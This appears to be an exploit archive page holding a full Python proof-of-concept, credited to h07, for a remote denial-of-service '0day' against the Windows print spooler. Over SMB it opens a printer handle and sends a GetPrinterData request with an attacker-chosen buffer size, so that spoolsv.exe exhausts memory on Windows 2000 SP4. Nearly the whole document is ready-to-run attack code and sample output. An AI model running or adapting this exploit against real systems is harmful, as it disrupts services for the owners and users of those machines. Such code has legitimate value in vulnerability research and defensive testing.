MS Windows spoolss GetPrinterData() Remote DoS Exploit (0day)
=============================================================



#!/usr/bin/python
# MS Windows spoolss GetPrinterData() 0day Memory Allocation Remote DoS Exploit
# Bug discovered by h07 <h07@interia.pl>
# Tested on Windows 2000 SP4 Polish + All Microsoft Security Bulletins
# Example:
#
# C:\>python spoolss_dos.py 192.168.0.2 512
#
# [*] MS Windows GetPrinterData() 0day Memory Allocation Remote DoS Exploit
# [*] Coded by h07 <h07@interia.pl>
# [*] Connecting to 192.168.0.2:445
# [+] Connected
# [+] The NETBIOS connection with the remote host timed out.
# [+] 192.168.0.2: Out of memory
# [+] Done
#
# Exploit --> GetPrinterData(handle, value, 1024 * 1024 * 512) --> MS_Windows
# Spooler service(spoolsv.exe) memory usage: 512 MB
##

from impacket.structure import Structure
from impacket.nmb import NetBIOSTimeout
from impacket.dcerpc import transport
from impacket import uuid
from struct import pack
from string import atoi
from sys import argv
from sys import exit

print "\n[*] MS Windows GetPrinterData() 0day Memory Allocation Remote DoS Exploit"
print "[*] Coded by h07 <h07@interia.pl>"

if(len(argv) < 3):
   print "[*] Usage: %s <host> <memory_size(MB)>" % (argv[0])
   print "[*] Sample: %s 192.168.0.1 512" % (argv[0])
   exit()

MB = 1024 * 1024
host = argv[1]
memory_size = MB * atoi(argv[2])
interface = (&#039;spoolss&#039;, &#039;12345678-1234-abcd-ef00-0123456789ab&#039;, &#039;1.0&#039;)

stringbinding = "ncacn_np:%(host)s[\\pipe\\%(pipe)s]"
stringbinding %= {
&#039;host&#039;: host,
&#039;pipe&#039;: interface[0],
}

class B1(Structure):
   alignment = 4
   structure = (
       (&#039;id&#039;, &#039;<L&#039;),
       (&#039;max&#039;, &#039;<L&#039;),
       (&#039;offset&#039;, &#039;<L=0&#039;),
       (&#039;actual&#039;, &#039;<L&#039;),
       (&#039;str&#039;, &#039;%s&#039;),
   )

class B2(Structure):
   alignment = 4
   structure = (
       (&#039;max&#039;, &#039;<L&#039;),
       (&#039;offset&#039;, &#039;<L=0&#039;),
       (&#039;actual&#039;, &#039;<L&#039;),
       (&#039;str&#039;, &#039;%s&#039;),
   )

class OpenPrinterEx(Structure):
   alignment = 4
   opnum = 69
   structure = (
       (&#039;printer&#039;, &#039;:&#039;, B1),
       (&#039;null&#039;, &#039;<L=0&#039;),
       (&#039;str&#039;, &#039;<L=0&#039;),
       (&#039;null2&#039;, &#039;<L=0&#039;),
       (&#039;access&#039;, &#039;<L=0&#039;),
       (&#039;level&#039;, &#039;<L=1&#039;),
       (&#039;id1&#039;, &#039;<L=1&#039;),
       (&#039;level2&#039;, &#039;<L=10941724&#039;),
       (&#039;size&#039;, &#039;<L=28&#039;),
       (&#039;id2&#039;, &#039;<L=0x42424242&#039;),
       (&#039;id3&#039;, &#039;<L=0x43434343&#039;),
       (&#039;build&#039;, &#039;<L=2600&#039;),
       (&#039;major&#039;, &#039;<L=3&#039;),
       (&#039;minor&#039;, &#039;<L=0&#039;),
       (&#039;processor&#039;, &#039;<L=0xFFFFFFFF&#039;),
       (&#039;client&#039;, &#039;:&#039;, B2),
       (&#039;user&#039;, &#039;:&#039;, B2),
   )

class GetPrinterData(Structure):
   alignment = 4
   opnum = 26
   structure = (
       (&#039;handle&#039;, &#039;%s&#039;),
       (&#039;value&#039;, &#039;:&#039;, B2),
       (&#039;offered&#039;, &#039;<L&#039;),
   )

trans = transport.DCERPCTransportFactory(stringbinding)

print "[*] Connecting to %s:445" % (host)
try:
   trans.connect()
except:
   print "[-] Connect failed"
   exit()

print "[+] Connected"

dce = trans.DCERPC_class(trans)
dce.bind(uuid.uuidtup_to_bin((interface[1], interface[2])))

query = OpenPrinterEx()
printer = "\\\\%s\x00" % (host)
query[&#039;printer&#039;] = B1()
query[&#039;printer&#039;][&#039;id&#039;] = 0x41414141
query[&#039;printer&#039;][&#039;max&#039;] = len(printer)
query[&#039;printer&#039;][&#039;actual&#039;] = len(printer)
query[&#039;printer&#039;][&#039;str&#039;] = printer.encode(&#039;utf_16_le&#039;)

client = "\\\\h07\x00"
query[&#039;client&#039;] = B2()
query[&#039;client&#039;][&#039;max&#039;] = len(client)
query[&#039;client&#039;][&#039;actual&#039;] = len(client)
query[&#039;client&#039;][&#039;str&#039;] = client.encode(&#039;utf_16_le&#039;)

user = "h07\x00"
query[&#039;user&#039;] = B2()
query[&#039;user&#039;][&#039;max&#039;] = len(user)
query[&#039;user&#039;][&#039;actual&#039;] = len(user)
query[&#039;user&#039;][&#039;str&#039;] = user.encode(&#039;utf_16_le&#039;)

dce.call(query.opnum, query)
raw = dce.recv()
handle = raw[:20]

if(handle == ("\x00" * 20)):
   print "[-] ERR: OpenPrinterEx()"
   if(raw[20:] == "\x09\x07\x00\x00"):
       print "[-] Return code: Invalid printer name (0x00000709)"
   if(raw[20:] == "\x05\x00\x00\x00"):
       print "[-] Return code: Access denied (0x00000005)"
   exit()

query = GetPrinterData()
value = "blah_blah\x00"
query[&#039;handle&#039;] = handle
query[&#039;value&#039;] = B2()
query[&#039;value&#039;][&#039;max&#039;] = len(value)
query[&#039;value&#039;][&#039;actual&#039;] = len(value)
query[&#039;value&#039;][&#039;str&#039;] = value.encode(&#039;utf_16_le&#039;)
query[&#039;offered&#039;] = memory_size

dce.call(query.opnum, query)

try:
   raw = dce.recv()
   status = raw[:4]
   r_size = raw[4:8]

   if(status == "\x1b\x00\x00\x1c"):
       print "[-] Memory allocation error, out of memory"
       exit()
   if(r_size == pack("<L", memory_size)):
       print "[+] Memory allocated"

except NetBIOSTimeout, err:
   print "[+] %s" % (err)
   print "[+] %s: Out of memory" % (host)

print "[+] Done"

# EoF



